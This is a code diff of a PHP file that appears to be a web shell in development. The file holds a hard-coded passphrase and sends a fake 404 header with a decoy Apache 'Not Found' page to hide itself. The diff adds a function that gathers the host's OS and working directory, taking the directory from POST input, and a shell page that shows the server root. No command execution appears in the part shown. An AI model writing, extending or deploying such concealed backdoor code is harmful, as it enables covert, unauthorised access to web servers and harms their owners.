@@ -9,6 +9,15 @@
   >>>>>>>>>>>>>>>>> */
   $passphrase = '136c757bdd877848762c248e58252935'; // cosasdepuma
 
+  $theme = array(
+    "clouds" => "#ecf0f1",
+    "midnight" => "#2c3e50",
+  
+    "yellow" => "#ffe066",
+    "dblue" => "#247ba0",
+    "lblue" => "#70c1b3",
+  );
+
   /* Headers
   >>>>>>>>>>>>>>>>> */
   header('HTTP/1.0 404 Not Found');
@@ -25,6 +34,23 @@
       exit;
 
   /* Functions
+  >>>>>>>>>>>>>>>>> */
+  function InformationGathering() {
+    $GLOBALS['INFO'] = array(
+      'OS' => (strtolower(substr(PHP_OS,0,3)) == "win") ? "win" : "nix",
+      'SHELL_CWD' => (isset($_POST['wd'])) ? $_POST['wd'] : getcwd(),
+      'SHELL_ROOT' => getcwd()
+    );
+    @chdir($GLOBALS['INFO']['SHELL_CWD']);
+    if($GLOBALS["INFO"]["OS"] == "win") {
+      $GLOBALS["INFO"]["SHELL_ROOT"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_ROOT"]);
+      $GLOBALS["INFO"]["SHELL_CWD"] = str_replace("\\", "/", $GLOBALS["INFO"]["SHELL_CWD"]);
+    }
+    if( $GLOBALS["INFO"]["SHELL_CWD"][strlen($GLOBALS["INFO"]["SHELL_CWD"])-1] != '/' ) 
+      $GLOBALS["INFO"]["SHELL_CWD"] .= '/'; 
+  }
+
+  /* Web pages
   >>>>>>>>>>>>>>>>> */
   function ApacheNotFound() {
     ?>
@@ -45,7 +71,18 @@
 
   function Shell() {
     ?>
-    
+      <!DOCTYPE html>
+      <html lang="en">
+        <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <meta http-equiv="X-UA-Compatible" content="ie=edge">
+          <title>404 Security Not Found</title>
+        </head>
+        <body>
+          <h1><?=$GLOBALS['INFO']['SHELL_ROOT']?></h1>
+        </body>
+      </html>
     <?php
   }
 
@@ -63,7 +100,8 @@
     } else {
       ApacheNotFound();
     }
-  } else {
-    Shell();
   }
+  
+  InformationGathering();
+  Shell();
 ?>
